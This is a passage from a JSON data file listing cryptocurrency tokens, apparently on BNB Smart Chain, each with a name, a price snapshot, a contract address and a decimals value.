    "address": "0xd8a1734945b9ba38eb19a291b475e31f49e59877",
    "decimals": "18"
}, {
    "name": "Super Launcher (LAUNCH)",
    "price": "0.16556741",
    "address": "0xb5389a679151c4b8621b1098c6e0961a3cfee8d4",
    "decimals": "18"
}, {
    "name": "Impossible Finance (IF)",
    "price": "0.082535",
    "address": "0xb0e1fc65c1a741b4662b813eb787d369b8614af1",
    "decimals": "18"
}, {
    "name": "Plasma (PPAY)",
    "price": "0.00427714",
    "address": "0xfb288d60d3b66f9c3e231a9a39ed3f158a4269aa",
    "decimals": "18"
}, {
    "name": "Plant vs Undead Token (PVU)",
    "price": "0.01294803",
    "address": "0x31471e0791fcdbe82fbf4c44943255e923f1b794",
    "decimals": "18"
}, {
    "name": "ClinTex (CTI)",
    "price": "0.00667006",
    "address": "0x3f670f65b9ce89b82e82121fd68c340ac22c08d6",
    "decimals": "18"
}, {
    "name": "Goose Golden Egg (EGG)",
    "price": "0.03653677",
    "address": "0xf952fc3ca7325cc27d15885d37117676d25bfda6",
    "decimals": "18"
}, {
    "name": "Coinary Token (CYT)",
    "price": "0.00233367",
    "address": "0xd9025e25bb6cf39f8c926a704039d2dd51088063",
    "decimals": "18"
}, {
    "name": "Hakka Finance on xDai on BSC (HAKKA)",
    "price": "0.00162385",
    "address": "0x1d1eb8e8293222e1a29d2c0e4ce6c0acfd89aaac",
    "decimals": "18"
}, {
    "name": "Extend Finance (EXF)",
    "price": "0.00053801",
    "address": "0x6306e883493824ccf606d90e25f68a28e47b98a3",
    "decimals": "9"
}, {
    "name": "Easy V2 (EZ)",
    "price": "0.064506",
    "address": "0x5512014efa6cd57764fa743756f7a6ce3358cc83",
    "decimals": "18"
}, {
    "name": "Helmet.insure Governance Token (Helmet)",
    "price": "0.0095602",
    "address": "0x948d2a81086a075b3130bac19e4c6dee1d2e3fe8",
    "decimals": "18"
}, {
    "name": "Streamity (STM)",
    "price": "0.01125835",
    "address": "0x90df11a8cce420675e73922419e3f4f3fe13cccb",
    "decimals": "18"
}, {
    "name": "LunaChow on xDai from xDai (LUCHOW)",
    "price": "0.00000041",
    "address": "0xe4e8e6878718bfe533702d4a6571eb74d79b0915",
    "decimals": "18"
}, {
    "name": "Energyfi Token (EFT)",
    "price": "0.00325366",
    "address": "0xae98e63db1c4646bf5b40b29c664bc922f71bc65",
    "decimals": "18"
}, {
    "name": "Mudol2 Token (MUDOL2)",
    "price": "0.04413948",
    "address": "0x5e7f472B9481C80101b22D0bA4ef4253Aa61daBc",
    "decimals": "18"
}, {
    "name": "Venus BCH (vBCH)",
    "price": "2.43891088",
    "address": "0x5f0388ebc2b94fa8e123f404b79ccf5f40b29176",
    "decimals": "8"
}, {
    "name": "Tycoon Token (TYC)",
    "price": "0.00376666",
    "address": "0x8DFD366ff98390ea35EaacB35673279218A596A5",
    "decimals": "18"
}, {
    "name": "Orion Money Token [via ChainPort.io] (ORION)",
    "price": "0.00332821",
    "address": "0x5530ec23f4ee1521182bd158c09f4ca7efec1ef0",
    "decimals": "18"
}, {
    "name": "SakeToken (SAKE)",
    "price": "0.00412454",
    "address": "0x8bd778b12b15416359a227f0533ce2d91844e1ed",
    "decimals": "18"
}, {
    "name": "DOS Network Token BEP20 (DOS)",
    "price": "0.0017509",
    "address": "0xdc0f0a5719c39764b011edd02811bd228296887c",
    "decimals": "18"
}, {
    "name": "pTokens $ANRX ($ANRX)",
    "price": "0.0022815",
    "address": "0xe2e7329499e8ddb1f2b04ee4b35a8d7f6881e4ea",
    "decimals": "18"
}, {
    "name": "Lympo Market Token (LMT)",
    "price": "0.00110968",
    "address": "0x9617857e191354dbea0b714d78bc59e57c411087",
    "decimals": "18"
}, {
    "name": "TravelCare (TRAVEL)",
    "price": "0.00083213",
    "address": "0x826e5ec70dbc5607ff9218011fbb97f9a8d97953",
    "decimals": "18"
}, {
    "name": "Berry Tributes (BRY)",
    "price": "0.08566822",
    "address": "0xf859Bf77cBe8699013d6Dbc7C2b926Aaf307F830",
    "decimals": "18"
}, {
    "name": "WorkQuest Token (WQT)",
    "price": "0.0036592",
    "address": "0xe89508D74579A06A65B907c91F697CF4F8D9Fac7",
    "decimals": "18"
}, {
    "name": "Propel (PROPEL)",
    "price": "0.00002316",
    "address": "0x9b44df3318972be845d83f961735609137c4c23c",
    "decimals": "18"
}, {
    "name": "GoSwapp (GOFI)",
    "price": "0.776852",
    "address": "0x6b8227a0e18bd35a10849601db194b24aab2c8ea",
    "decimals": "18"
}, {
    "name": "Yearn Secure (YSEC)",
    "price": "0.122387",
    "address": "0x56a0f16af7c8098141b363094fcf864d52831326",
    "decimals": "18"
}, {
    "name": "Robust Token (RBT)",
    "price": "3.08",
    "address": "0x891e4554227385c5c740f9b483e935e3cbc29f01",
    "decimals": "18"
}, {
    "name": "GamyFi (GFX)",
    "price": "0.0349646",
    "address": "0x65ad6a2288b2dd23e466226397c8f5d1794e58fc",
    "decimals": "18"
}, {
    "name": "ArgonToken (ARGON)",
    "price": "0.00132938",
    "address": "0x851f7a700c5d67db59612b871338a85526752c25",
    "decimals": "18"
}, {
    "name": "Twinci (TWIN)",
    "price": "0.0427336",
    "address": "0xaf83f292fced83032f52ced45ef7dbddb586441a",
    "decimals": "18"
}, {
    "name": "Buni Token (BUNI)",
    "price": "0.00275807",
    "address": "0x0e7beec376099429b85639eb3abe7cf22694ed49",
    "decimals": "18"
}, {
    "name": "Kripton (LPK)",
    "price": "0.00006018",
    "address": "0x9b71b5511998e0798625b8fa74e86d8192de78c1",
    "decimals": "18"
}, {
    "name": "Cubiex (CBIX)",
    "price": "0.00061538",
    "address": "0x34681c1035f97e1edcccec5f142e02ff81a3a230",
    "decimals": "18"
}, {
    "name": "RigelToken (RGP)",
    "price": "0.04762606",
    "address": "0xfa262f303aa244f9cc66f312f0755d89c3793192",
    "decimals": "18"
}, {
    "name": "CafeSwap Token (BREW)",
    "price": "0.00200436",
    "address": "0x790be81c3ca0e53974be2688cdb954732c9862e1",
    "decimals": "18"
}, {
    "name": "BAGEL (BAGEL)",
    "price": "0.00128618",
    "address": "0xbb238fce6e2ee90781cd160c9c6eaf3a4cfad801",
    "decimals": "18"
}, {
    "name": "Squirrel Finance (NUTS)",
    "price": "0.065423",
    "address": "0x8893d5fa71389673c5c4b9b3cb4ee1ba71207556",
    "decimals": "18"
}, {
    "name": "StaysBASE (SBS)",
    "price": "0.00781904",
    "address": "0xc1d99537392084cc02d3f52386729b79d01035ce",
    "decimals": "9"
}, {
    "name": "FlashX Ultra (FSXU)",
    "price": "0.00015228",
    "address": "0xa94b7a842aadb617a0b08fa744e033c6de2f7595",
    "decimals": "8"
}, {
    "name": "UBUToken (UBU)",
    "price": "0.00215968",
    "address": "0xd2ddfba7bb12f6e70c2aab6b6bf9edaef42ed22f",
    "decimals": "18"
}, {
    "name": "Fusible | Fusible.io (FUSII)",
    "price": "0.03006098",
    "address": "0x3a50d6daacc82f17a2434184fe904fc45542a734",
    "decimals": "18"
}, {
    "name": "MMToken (MM)",
    "price": "0.04289561",
    "address": "0x73f059db0182dc2ed716d028e1b13033cfcbf63b",
    "decimals": "18"
}, {
    "name": "Multiplier (bMXX)",
    "price": "0.00294515",
    "address": "0x4131b87f74415190425ccd873048c708f8005823",
    "decimals": "18"
}, {
    "name": "2local Token (2LC)",
    "price": "0.00000362",
    "address": "0x11f6ecc9e2658627e0876212f1078b9f84d3196e",
    "decimals": "18"
}, {
    "name": "SF Capital (SFCP)",
    "price": "0.0000605",
    "address": "0x5ce8e55e256e4bd58cea94963d4cb280de6b8bb2",
    "decimals": "18"
}, {
    "name": "Binance Beacon ETH (BETH)",
    "price": "1511.70251964",
    "address": "0x250632378e573c6be1ac2f97fcdf00515d0aa91b",
    "decimals": "18"
}, {
    "name": "Staked BNB (stkBNB)",
    "price": "292.82",
    "address": "0xc2E9d07F66A89c44062459A47a0D2Dc038E4fb16",
    "decimals": "18"
}, {
    "name": "Liquid Staking BNB (BNBx)",
    "price": "290.45",
    "address": "0x1bdd3Cf7F79cfB8EdbB955f20ad99211551BA275",
    "decimals": "18"
}, {
    "name": "Binance-Peg Bitcoin Cash ABC (BCHA)",
    "price": "114.34798314",
    "address": "0xd475c9c934dcd6d5f1cac530585aa5ba14185b92",
    "decimals": "18"
}, {
    "name": "GoatGang (GGT)",
    "price": "91.67",
    "address": "0x0195Af07ff81E2dCdd40BB8F7719fb4426a978C9",
    "decimals": "18"
}, {
    "name": "Venus BETH (vBETH)",
    "price": "63.27675537",
    "address": "0x972207a639cc1b374b893cc33fa251b55ceb7c07",
    "decimals": "8"
}, {
    "name": "Octree Finance (OCT)",
    "price": "55.03",
    "address": "0x49277cc5be56b519901e561096bfd416277b4f6d",
    "decimals": "8"
}, {
    "name": "Fuel Token (Fuel)",
    "price": "21.56278317",
    "address": "0x2090c8295769791ab7a3cf1cc6e0aa19f35e441a",
    "decimals": "18"
}, {
    "name": "META-UTOPIA LAND (LAND)",
    "price": "20.31",
    "address": "0x9131066022B909C65eDD1aaf7fF213dACF4E86d0",
    "decimals": "18"
}, {
    "name": "vSWAP.fi (vBSWAP)",
    "price": "16.03",
    "address": "0x4f0ed527e8a95ecaa132af214dfd41f30b361600",
    "decimals": "18"
}, {
    "name": "Ethereum Message Search from Mainnet (EMS)",
    "price": "8.27",
    "address": "0x8444bd389e5db8ceaad7b95466a0b8a1939af1a9",
    "decimals": "18"
}, {
    "name": "PancakeSwap Token (Cake)",
    "price": "4.72064479",
    "address": "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
    "decimals": "18"
}, {
    "name": "CUSTODIY $CTY (CTY)",
    "price": "2.94",
    "address": "0x188173379ac8963048afe01c5d3d5998fee67254",
    "decimals": "18"
}, {
    "name": "Binance-Peg Firo Token (FIRO)",
    "price": "2.67",
    "address": "0xd5d0322b6bab6a762c79f8c81a0b674778e13aed",
    "decimals": "8"
}, {
    "name": "Bat True Share (BTS)",
    "price": "2.64",
    "address": "0xc2e1acef50ae55661855e8dcb72adb182a3cc259",
    "decimals": "18"
}, {
    "name": "Bitcoin Pay (BTCPAY)",
    "price": "2.56",
    "address": "0x9f5c37e0fd9bf729b1f0a6f39ce57be5e9bfd435",
    "decimals": "18"
}, {
    "name": "ArenaPlay (APC)",
    "price": "1.71",
    "address": "0x2AA504586d6CaB3C59Fa629f74c586d78b93A025",
    "decimals": "18"
}, {
    "name": "Surf (SURF)",
    "price": "1.69",
    "address": "0xE664cbfAB870413da211F78709911b98950fD94c",
    "decimals": "5"
}, {
    "name": "Seven Up Token (7UP)",
    "price": "1.59509477",
    "address": "0x29f350b3822f51dc29619c583adbc9628646e315",
    "decimals": "18"
}, {
    "name": "Hectagon (HECTA)",
    "price": "1.57",
    "address": "0x343915085b919fbd4414F7046f903d194c6F60EE",
    "decimals": "9"
}, {
    "name": "LinkDao (LKD)",
    "price": "1.18",
    "address": "0xaF027427DC6d31A3e7e162A710a5Fe27e63E275F",
    "decimals": "18"
}, {
    "name": "https://degen.trade/ (DGN)",
    "price": "1.15",
    "address": "0x72f28c09be1342447fa01ebc76ef508473d08c5c",
    "decimals": "18"
}, {
    "name": "BSCX (BSCX)",
    "price": "1.09019771",
    "address": "0x5ac52ee5b2a633895292ff6d8a89bb9190451587",
    "decimals": "18"
}, {
    "name": "Spore Token (SPORE)",
    "price": "0.562683",
    "address": "0x77f6a5f1b7a2b6d6c322af8581317d6bb0a52689",
    "decimals": "18"
}, {
    "name": "GFORCE v2 (GFCE)",
    "price": "0.560159",
    "address": "0x5f136383e230f972739fae2e81e7e774afe64c66",
    "decimals": "9"
}, {
    "name": "BUX Token (BUX)",
    "price": "0.4946594",
    "address": "0x211ffbe424b90e25a15531ca322adf1559779e45",
    "decimals": "18"
}, {
    "name": "Thoreumv3 - Thoreum.Capital (THOREUM)",
    "price": "0.47337317",
    "address": "0xce1b3e5087e8215876af976032382dd338cf8401",
    "decimals": "18"
}, {
    "name": "Pylon Eco Token (PETN)",
    "price": "0.450825",
    "address": "0x57457b5d725d85a70a3625d6a71818304e773618",
    "decimals": "18"
}, {
    "name": "VANCI.FINANCE (VANCII)",
    "price": "0.399969",
    "address": "0x8f9b482b74afc0b7e8aefc704f1f04df208ee332",
    "decimals": "18"
}, {
    "name": "RobustSwap Token (RBS)",
    "price": "0.26271294",
    "address": "0x95336aC5f7E840e7716781313e1607F7C9D6BE25",
    "decimals": "18"
}, {
    "name": "Shield Protocol (SHIELD)",
    "price": "0.250951",
    "address": "0x00f97c17f4dc4f3bfd2dd9ce5e67f3a339a8a261",
    "decimals": "18"
}, {
    "name": "HPSv2 (HPS)",
    "price": "0.23828055",
    "address": "0xc9D53A339F3c22E016C6fA1E3Eb85AC32c75fED2",
    "decimals": "18"
}, {
    "name": "Keep3r BSC Network (KP3RB)",
    "price": "0.14476501",
    "address": "0x5ea29eee799aa7cc379fde5cf370bc24f2ea7c81",
    "decimals": "18"
}, {
    "name": "BSCstarter (START)",
    "price": "0.14224153",
    "address": "0x31d0a7ada4d4c131eb612db48861211f63e57610",
    "decimals": "18"
}, {
    "name": "MetaLand Shares (MLS)",
    "price": "0.128926",
    "address": "0x5F2F6c4C491B690216E0f8Ea753fF49eF4E36ba6",
    "decimals": "18"
}, {
    "name": "M7V2 (M7V2)",
    "price": "0.128277",
    "address": "0x8d55eca212a56e9d3a0c337950f910e3397e1e68",
    "decimals": "8"
}, {
    "name": "Okse (OKSE)",
    "price": "0.125025",
    "address": "0x606fb7969fc1b5cad58e64b12cf827fb65ee4875",
    "decimals": "18"
}, {
    "name": "Venus FIL (vFIL)",
    "price": "0.11322159",
    "address": "0xf91d58b5ae142dacc749f58a49fcbac340cb0343",
    "decimals": "8"
}, {
    "name": "Venus XVS (vXVS)",
    "price": "0.106702",
    "address": "0x151b1e2635a717bcdc836ecd6fbb62b674fe3e1d",
    "decimals": "8"
}, {
    "name": "Ultron (ULX)",
    "price": "0.105975",
    "address": "0xd983AB71a284d6371908420d8Ac6407ca943F810",
    "decimals": "18"
}, {
    "name": "Weather (Weather)",
    "price": "0.101574",
    "address": "0xbe3e4cfd929156f612df36042d79201ecf5344d7",
    "decimals": "18"
}, {
    "name": "Genta (GENA)",
    "price": "0.096286",
    "address": "0x7f4959528D4C9c7379b3437C7Eea40376fD96B8a",
    "decimals": "18"
}, {
    "name": "GoMining Token (GMT)",
    "price": "0.09574",
    "address": "0x7ddc52c4de30e94be3a6a0a2b259b2850f421989",
    "decimals": "18"
}, {
    "name": "MarketLedger (ML)",
    "price": "0.08735675",
    "address": "0xc4fB957e3F1c04C8Dc4000525e55920861F25bFc",
    "decimals": "18"
}, {
    "name": "GrowMoon (GM)",
    "price": "0.082778",
    "address": "0x2BacbA5078611E261Dc55487E1bB9c145Df49Cc7",
    "decimals": "18"
}, {
    "name": "Adonis (ADON)",
    "price": "0.081217",
    "address": "0xcd392021084683803525fe5e6c00cae9c6be5774",
    "decimals": "18"
}, {
    "name": "GG TOKEN (GGTKN)",
    "price": "0.08118657",
    "address": "0x1f7e8fe01aeba6fdaea85161746f4d53dc9bda4f",
    "decimals": "18"
}, {
    "name": "Bat True Dollar (BTD)",
    "price": "0.08048153",
    "address": "0xd1102332a213e21faf78b69c03572031f3552c33",
    "decimals": "18"
}, {
    "name": "Bunny Token (BUNNY)",
    "price": "0.07550532",
    "address": "0xc9849e6fdb743d08faee3e34dd2d1bc69ea11a51",
    "decimals": "18"
}, {
    "name": "NDB (NDB)",
    "price": "0.058947",
    "address": "0xf8028b65005B0B45f76988d2A77910186E7af4eF",
    "decimals": "12"
}, {
    "name": "TOZEX (TOZ)",
    "price": "0.053446",
    "address": "0xcf0bea8b08fd28e339eff49f717a828f79f7f5ec",
    "decimals": "18"
}, {
    "name": "GAMMA (GAMMA)",
    "price": "0.05334327",
    "address": "0xb3cb6d2f8f2fde203a022201c81a96c167607f15",
    "decimals": "18"
}, {
    "name": "Dogestribute (DGSTB)",
    "price": "0.0488353",
    "address": "0x5aa638c6777e2f041951a3d539a32cac83503441",
    "decimals": "9"
}, {
    "name": "LoopNetwork (LOOP)",
    "price": "0.04349984",
    "address": "0xce186ad6430e2fe494a22c9edbd4c68794a28b35",
    "decimals": "18"
}, {
    "name": "Krabots (KRAC)",
    "price": "0.03748694",
    "address": "0xb91F0fdFfdDE4d6D53ac4066AcC32aA81fC6DE2C",
    "decimals": "18"
}, {
    "name": "Virtual Meta (VMA)",
    "price": "0.03428427",
    "address": "0xcC6C9773A8a70C4642dFfCEb017742830AAAC1a6",
    "decimals": "18"
}, {
    "name": "ETHAX (ETHAX)",
    "price": "0.03405283",
    "address": "0x854f7cd3677737241e3eed0dc3d7f33dfaf72bc4",
    "decimals": "18"
}, {
    "name": "Tenup DAO Token (TUP)",
    "price": "0.03300975",
    "address": "0x63eaEB6E33E11252B10553900a9F38A9ed172871",
    "decimals": "18"
}, {
    "name": "Linear Token (LINA)",
    "price": "0.0329351",
    "address": "0x762539b45a1dcce3d36d080f74d1aed37844b878",
    "decimals": "18"
}, {
    "name": "Kiwi Token (KIWI)",
    "price": "0.03081283",
    "address": "0xcfdf8a80fecaeecc144fa74c0df8691bfd0e26e3",
    "decimals": "18"
}, {
    "name": "Uplift (LIFT)",
    "price": "0.02974253",
    "address": "0x513c3200f227ebb62e3b3d00b7a83779643a71cf",
    "decimals": "18"
}, {
    "name": "DEFI 100 (D100)",
    "price": "0.02871686",
    "address": "0x9d8aac497a4b8fe697dd63101d793f0c6a6eebb6",
    "decimals": "9"
}, {
    "name": "COMMUNIQUE (CMQ)",
    "price": "0.02607704",
    "address": "0x074E91c178e4B4c6228357A5A0B6df5aD824f0d8",
    "decimals": "18"
}, {
    "name": "Encyclopedia wTa (ENCwTa)",
    "price": "0.02346168",
    "address": "0xEa4bCFFf56Ef4aeDd7f41Fc260F13f2eEE7DeFCe",
    "decimals": "18"
}, {
    "name": "Wetux (WETUX)",
    "price": "0.02305288",
    "address": "0x58f0C2fd4B7B0fBaC97c9cC71A5Eb810627734C8",
    "decimals": "8"
}, {
    "name": "binance conflux Flux Protocol (bcFLUX)",
    "price": "0.02176282",
    "address": "0x0747cda49c82d3fc6b06df1822e1de0c16673e9f",
    "decimals": "18"
}, {
    "name": "Jointer (JNTR)",
    "price": "0.02068295",
    "address": "0x5f2caa99fc378248ac02cbbaac27e3fa155ed2c4",
    "decimals": "18"
}, {
    "name": "Space Token (SPACE)",
    "price": "0.01584075",
    "address": "0x9d9affac2175ef541642035ab66f5fe7df813851",
    "decimals": "18"
}, {
    "name": "Phoswap (PHO)",
    "price": "0.01553803",
    "address": "0xb9784c1633ef3b839563b988c323798634714368",
    "decimals": "8"
}, {
    "name": "WalletNow (WNOW)",
    "price": "0.01539947",
    "address": "0x56aa0237244c67b9a854b4efe8479cca0b105289",
    "decimals": "18"
}, {
    "name": "Extended Guapcoin (xGUAP)",
    "price": "0.01258295",
    "address": "0xd74068c0fff0694bb7ad88bce9cdc5f74799f05c",
    "decimals": "18"
}, {
    "name": "OwlDAO token (OWL)",
    "price": "0.01241631",
    "address": "0x9085b4d52c3e0b8b6f9af6213e85a433c7d76f19",
    "decimals": "18"
}, {
    "name": "EVAI (EV)",
    "price": "0.0123102",
    "address": "0x2167afa1c658dc5c4ec975f4af608ff075a8b8ae",
    "decimals": "8"
}, {
    "name": "EVAI.IO (EVAI)",
    "price": "0.0123102",
    "address": "0x233302a38fdbdd2b3f6ee19a66d7e47c4a64fe46",
    "decimals": "8"
}, {
    "name": "Crox Token (CROX)",
    "price": "0.01140633",
    "address": "0x2c094f5a7d1146bb93850f629501eb749f6ed491",
    "decimals": "18"
}, {
    "name": "Hot Cross Token (HOTCROSS)",
    "price": "0.0114037",
    "address": "0x4fa7163e153419e0e1064e418dd7a99314ed27b6",
    "decimals": "18"
}, {
    "name": "Immutable (DARA)",
    "price": "0.01113417",
    "address": "0x0255af6c9f86f6b0543357bacefa262a2664f80f",
    "decimals": "18"
}, {
    "name": "Elemon Token (ELMON)",
    "price": "0.0109753",
    "address": "0xe3233fdb23f1c27ab37bd66a19a1f1762fcf5f3f",
    "decimals": "18"
}, {
    "name": "CBK (CBK)",
    "price": "0.01074783",
    "address": "0x4f60a160d8c2dddaafe16fcc57566db84d674bd6",
    "decimals": "18"
}, {
    "name": "Venus XRP (vXRP)",
    "price": "0.01002936",
    "address": "0xb248a295732e0225acd3337607cc01068e3b9c10",
    "decimals": "8"
}, {
    "name": "CanYaCoin (CAN)",
    "price": "0.00985948",
    "address": "0x007ea5c0ea75a8df45d288a4debdd5bb633f9e56",
    "decimals": "18"
}, {
    "name": "Vaulty Token (VLTY)",
    "price": "0.0093868",
    "address": "0x38A5cbe2FB53d1d407Dd5A22C4362daF48EB8526",
    "decimals": "18"
}, {
    "name": "Venus ADA (vADA)",
    "price": "0.00875013",
    "address": "0x9a0af7fdb2065ce470d72664de73cae409da28ec",
    "decimals": "8"
}, {
    "name": "WANDA EXCHANGE (WE)",
    "price": "0.00834612",
    "address": "0x0dd3a140346a94d403ac62385daaf5a86b50e752",
    "decimals": "8"
}, {
    "name": "cheesemaker.farm (CHS)",
    "price": "0.00746504",
    "address": "0xadd8a06fd58761a5047426e160b2b88ad3b9d464",
    "decimals": "18"
}, {
    "name": "Cross Finance (CRP)",
    "price": "0.00746039",
    "address": "0x1ad8d89074afa789a027b9a31d0bd14e254711d0",
    "decimals": "18"
}, {
    "name": "N1CEToken (N1CE)",
    "price": "0.00743072",
    "address": "0xc14df1e2fff3708816495e7364ff274aceecad91",
    "decimals": "18"
}, {
    "name": "DeSpace Protocol (DES)",
    "price": "0.00693351",
    "address": "0xb38b3c34e4bb6144c1e5283af720E046Ee833a2a",
    "decimals": "18"
}, {
    "name": "Ramen Token (Ramen)",
    "price": "0.00601904",
    "address": "0x4f47a0d15c1e53f3d94c069c7d16977c29f9cb6b",
    "decimals": "18"
}, {
    "name": "Annex (ANN)",
    "price": "0.00576975",
    "address": "0x98936Bde1CF1BFf1e7a8012Cee5e2583851f2067",
    "decimals": "18"
}, {
    "name": "GameStation (GAMER)",
    "price": "0.00565157",
    "address": "0x3f6b3595ecf70735d3f48d69b09c4e4506db3f47",
    "decimals": "18"
}, {
    "name": "LIMOCOIN SWAP (LMCSWAP)",
    "price": "0.00556155",
    "address": "0x383094a91ef2767eed2b063ea40465670bf1c83f",
    "decimals": "18"
}, {
    "name": "PANDORA (PNDR)",
    "price": "0.00538255",
    "address": "0x6c1efbed2f57dd486ec091dffd08ee5235a570b1",
    "decimals": "18"
}, {
    "name": "Oceans Finance v2 (Oceansv2)",
    "price": "0.00473917",
    "address": "0x2A54F9710ddeD0eBdde0300BB9ac7e21cF0E8DA5",
    "decimals": "5"
}, {
    "name": "PontoonToken (TOON)",
    "price": "0.00444052",
    "address": "0xaeE433ADeBe0FBB88dAa47eF0C1A513CaA52EF02",
    "decimals": "18"
}, {
    "name": "Taco (TACO)",
    "price": "0.00425254",
    "address": "0x9066e87Bac891409D690cfEfA41379b34af06391",
    "decimals": "18"
}, {
    "name": "DVX (DRIVENx)",
    "price": "0.00412875",
    "address": "0x6db3972c6a5535708e7a4f7ad52f24d178d9a93e",
    "decimals": "18"
}, {
    "name": "Monverse (Monstr)",
    "price": "0.00376023",
    "address": "0x3933E1cDD51DE9b0f7d062AC8549cCdf63C219a9",
    "decimals": "18"
}, {
    "name": "JetSwap Token (WINGS)",
    "price": "0.00375045",
    "address": "0x0487b824c8261462f88940f97053e65bdb498446",
    "decimals": "18"
}, {
    "name": "Mithrilverse (MITHRIL)",
    "price": "0.00334262",
    "address": "0x566FdF5bF13b9642CbDfDd1e5F2A67DC2Bc1755A",
    "decimals": "18"
}, {
    "name": "EarnX (EarnX)",
    "price": "0.00329062",
    "address": "0x0f76142D83ddEF359753ccA33647Cc4dCEe1C6d1",
    "decimals": "18"
}, {
    "name": "SOULS OF META (SOM)",
    "price": "0.00271146",
    "address": "0x31c573d1A50A745b01862edAf2ae72017cea036A",
    "decimals": "9"
}, {
    "name": "Sphynx Labs (SPHYNX)",
    "price": "0.00246809",
    "address": "0x6e281f90c6D1b5E5A01FB6f14C428afF69c04C3F",
    "decimals": "18"
}, {
    "name": "Zombie World Z (ZwZ)",
    "price": "0.0021263",
    "address": "0x5445451c07e20ba1ca887b6c74d66d358f46d083",
    "decimals": "18"
}, {
    "name": "Useless (1USE)",
    "price": "0.0019646",
    "address": "0x60d66a5152612f7d550796910d022cb2c77b09de",
    "decimals": "18"
}, {
    "name": "Pasta Token (PASTA)",
    "price": "0.0019567",
    "address": "0xab9d0fae6eb062f2698c2d429a1be9185a5d4f6e",
    "decimals": "18"
}, {
    "name": "CORE MultiChain Token (CMCX)",
    "price": "0.00183843",
    "address": "0xb2343143f814639c9b1f42961c698247171df34a",
    "decimals": "18"
}, {
    "name": "LunaGens (LUNG)",
    "price": "0.00175122",
    "address": "0x28B9aed756De31B6b362aA0f23211D13093EBb79",
    "decimals": "18"
}, {
    "name": "Venus DOGE (vDOGE)",
    "price": "0.00129301",
    "address": "0xec3422ef92b2fb59e84c8b02ba73f1fe84ed8d71",
    "decimals": "8"
}, {
    "name": "RegularPresale (REGU)",
    "price": "0.00119217",
    "address": "0xf1ca73caa1c7ad66af11147ba7d5636243af0493",
    "decimals": "18"
}, {
    "name": "Pearl Token (PEARL)",
    "price": "0.00090087",
    "address": "0x118b60763002f3ba7603a3c17f946a0c7dab789f",
    "decimals": "18"
}, {
    "name": "SYL (SYL)",
    "price": "0.00086774",
    "address": "0x7e52a123ed6db6ac872a875552935fbbd2544c86",
    "decimals": "6"
}, {
    "name": "GemDao (GemDao)",
    "price": "0.00077057",
    "address": "0x3e990DE85Dbd92c9F616A1a4AbeAAE6243Be374b",
    "decimals": "9"
}, {
    "name": "Etermon (ETM)",
    "price": "0.00073427",
    "address": "0x75bded6bf44bb01527138673dcc064dbe3e7d96d",
    "decimals": "18"
}, {
    "name": "Sea Token (SEA)",
    "price": "0.00048991",
    "address": "0xfb52fc1f90dd2b070b9cf7ad68ac3d68905643fa",
    "decimals": "18"
}, {
    "name": "Augmented Finance (AGF)",
    "price": "0.00048459",
    "address": "0x114597f4260caf4cde1eeb0b9d9865b0b7b9a46a",
    "decimals": "18"
}, {
    "name": "INME RUN (INMER)",
    "price": "0.00043659",
    "address": "0xCABa634307B94f04390afC144A9b841875289751",
    "decimals": "9"
}, {
    "name": "DOGGY (DOGGY)",
    "price": "0.00042033",
    "address": "0x74926b3d118a63f6958922d3dc05eb9c6e6e00c6",
    "decimals": "18"
}, {
    "name": "Cryptonits (CRT)",
    "price": "0.00040164",
    "address": "0x36a28c7c9b3dea22f07f4df67833cbe764feeeb4",
    "decimals": "18"
}, {
    "name": "Safechaintoken (SCT)",
    "price": "0.00040045",
    "address": "0xc3262500039696ff8ef9830fb422ab32b15bd366",
    "decimals": "9"
}, {
    "name": "Metegg DeFi (MDEFI)",
    "price": "0.00035515",
    "address": "0x0475AE77fb55005F15554642d6016c75FD04227A",
    "decimals": "18"
}, {
    "name": "Titano (TITANO)",
    "price": "0.00024553",
    "address": "0x4e3cabd3ad77420ff9031d19899594041c420aee",
    "decimals": "18"
}, {
    "name": "MLOKY (MLOKY)",
    "price": "0.00021471",
    "address": "0xF71E950758310faF9f7D51C4F4250C7546086C1f",
    "decimals": "9"
}, {
    "name": "ALL BEST ICO SATOSHI (SATSALL)",
    "price": "0.00020291",
    "address": "0x6101Dc7289eb8F31a0C93E6b36feCB52fd3dE9F2",
    "decimals": "18"
}, {
    "name": "Ezcoin Market (ECM)",
    "price": "0.00018268",
    "address": "0x87e837803513e8c735a4eC1bcbf97Bc3050F41a5",
    "decimals": "0"
}, {
    "name": "Unidef (U)",
    "price": "0.00016996",
    "address": "0x89dB9B433FeC1307d3dc8908f2813e9f7a1d38F0",
    "decimals": "18"
}, {
    "name": "Lucky Unicorn Token (L99)",
    "price": "0.00015426",
    "address": "0x033c90840F27C83B1Aa0Ffe6Db65C954BF6ABbdd",
    "decimals": "18"
}, {
    "name": "ENERGY COIN (ENG)",
    "price": "0.00012017",
    "address": "0x8a505D5Cb3Db9fcf404c0A72aF3dF8Be4eFB707c",
    "decimals": "18"
}, {
    "name": "WINk (WIN)",
    "price": "0.00011134",
    "address": "0xaef0d72a118ce24fee3cd1d43d383897d05b4e99",
    "decimals": "18"
}, {
    "name": "BetSwirl Token (BETS)",
    "price": "0.00005955",
    "address": "0x3e0a7C7dB7bB21bDA290A80c9811DE6d47781671",
    "decimals": "18"
}, {
    "name": "OKEYCOIN (OKEY)",
    "price": "0.00002696",
    "address": "0xC628D60B7eC7504B7482bc8a65348F3b7afCCbE0",
    "decimals": "8"
}, {
    "name": "loser coin (lowb)",
    "price": "0.00001874",
    "address": "0x843d4a358471547f51534e3e51fae91cb4dc3f28",
    "decimals": "18"
}, {
    "name": "SPORTOKEN (SPT)",
    "price": "0.00001828",
    "address": "0xD677Bed5adF1de76F957b108dadb280bAA8F76B5",
    "decimals": "18"
}, {
    "name": "8BIT DOGE (BITD)",
    "price": "0.00001071",
    "address": "0x003f83da9868acc151be89eefa4d19838ffe5d64",
    "decimals": "9"
}, {
    "name": "Moonlift (MLTPX)",
    "price": "0.00000926",
    "address": "0x9d7c580e0bc4ea441db96eebc7e1440d264bce51",
    "decimals": "18"
}, {
    "name": "Xpose (Xpose)",
    "price": "0.00000851",
    "address": "0xcc10c8afd683c5aa86b1d170d75b555bce5a2c37",
    "decimals": "9"
}, {
    "name": "Inescoin (INES)",
    "price": "0.00000701",
    "address": "0x03db11045b299b1148f73c1ad07a22e5785985bf",
    "decimals": "18"
}, {
    "name": "Covid Vaccine (COVAC)",
    "price": "0.00000694",
    "address": "0x2ADfe76173F7e7DAef1463A83BA4d06171fAc454",
    "decimals": "18"
}, {
